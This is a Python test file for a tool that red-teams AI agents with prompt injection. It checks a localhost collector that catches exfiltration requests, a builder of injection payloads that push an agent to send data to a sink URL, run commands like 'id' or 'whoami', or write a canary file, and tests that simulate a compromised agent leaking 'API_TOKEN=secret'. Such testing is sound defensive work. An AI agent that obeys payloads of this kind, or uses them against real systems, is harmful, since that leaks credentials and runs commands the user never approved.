"""Tests for the real-target agentic-injection harness (friday.skills.agentic_target).

The collector + confirm path runs for real over localhost (no external network): a test plays the
role of a compromised agent by making the exfil request the injection asks for, and we assert
echo-proof confirmation. A benign agent (no request, or a request to the WRONG token) never
confirms.
"""

from __future__ import annotations

import urllib.request

import pytest

from friday.skills import agentic_target as at


def _hit(url: str, data: str = "", method: str = "POST") -> None:
    req = urllib.request.Request(url, data=data.encode() or None, method=method)
    urllib.request.urlopen(req, timeout=5).read()  # noqa: S310 — localhost test collector


def test_collector_records_and_tokenizes() -> None:
    with at.ExfilCollector() as c:
        tok = "0dinABC123"
        _hit(f"{c.url}/{tok}", "API_TOKEN=secret")
        _hit(f"{c.url}/other", "unrelated")
        assert len(c.hits) == 2
        hits = c.token_hits(tok)
        assert len(hits) == 1 and hits[0]["method"] == "POST"
        assert "API_TOKEN=secret" in hits[0]["body"]


def test_collector_records_get_too() -> None:
    with at.ExfilCollector() as c:
        _hit(f"{c.url}/0dinTOK?x=1", method="GET")
        assert c.token_hits("0dinTOK") and c.token_hits("0dinTOK")[0]["method"] == "GET"


def test_build_payloads_read_contains_sink_and_action() -> None:
    payloads = at.build_payloads("http://collector:9/", "0dinTOK", "read")
    assert len(payloads) == 3
    for _label, content in payloads:
        assert "http://collector:9/0dinTOK" in content
        assert "POST" in content.upper()


def test_build_payloads_execute_uses_benign_command_by_default() -> None:
    payloads = at.build_payloads("http://c", "0dinTOK", "execute")
    assert all("`id`" in content for _l, content in payloads)


def test_build_payloads_execute_custom_command() -> None:
    payloads = at.build_payloads("http://c", "0dinTOK", "execute", command="whoami")
    assert all("whoami" in content for _l, content in payloads)


def test_build_payloads_write_drops_canary_file() -> None:
    payloads = at.build_payloads("http://c", "0dinTOK", "write")
    assert all("0din_poc_0dinTOK.txt" in c and "0dinTOK" in c for _l, c in payloads)


def test_build_payloads_rejects_bad_class() -> None:
    with pytest.raises(ValueError, match="read"):
        at.build_payloads("http://c", "t", "bogus")


def test_confirm_only_on_token_hit() -> None:
    with at.ExfilCollector() as c:
        assert at.confirm(c, "0dinTOK") is None              # nothing yet
        _hit(f"{c.url}/wrongtoken", "x")
        assert at.confirm(c, "0dinTOK") is None              # wrong token — not our echo-proof URL
        _hit(f"{c.url}/0dinTOK", "leaked")
        hit = at.confirm(c, "0dinTOK")
        assert hit and hit["body"] == "leaked"


def test_end_to_end_read_confirms_and_drafts_finding() -> None:
    """Full contract: build a Read payload → a 'compromised agent' calls the sink URL taken from the
    payload → confirm returns the hit → as_finding shapes a submittable finding."""
    with at.ExfilCollector() as c:
        tok = at._token()
        payloads = at.build_payloads(c.url, tok, "read")
        sink = f"{c.url}/{tok}"
        assert sink in payloads[0][1]                        # the agent would extract exactly this
        _hit(sink, "API_TOKEN=hunter2")                      # simulate the compromised agent
        hit = at.confirm(c, tok)
        assert hit is not None
        finding = at.as_finding("acme-agent", "read", hit, payloads[0][1], tok)
        assert finding["category"] == "agentic_read_violation"
        assert finding["vulnerable"] and finding["severity"] == "critical"
        assert tok in finding["canary"] and "echo-proof" in finding["evidence"]


def test_as_finding_write_is_high_severity() -> None:
    hit = {"method": "POST", "path": "/t", "body": "", "from": "1.2.3.4"}
    f = at.as_finding("t", "write", hit, "payload", "0dinTOK")
    assert f["category"] == "agentic_write_violation" and f["severity"] == "high"


def test_token_is_unique_and_prefixed() -> None:
    assert at._token() != at._token() and at._token().startswith("0din")
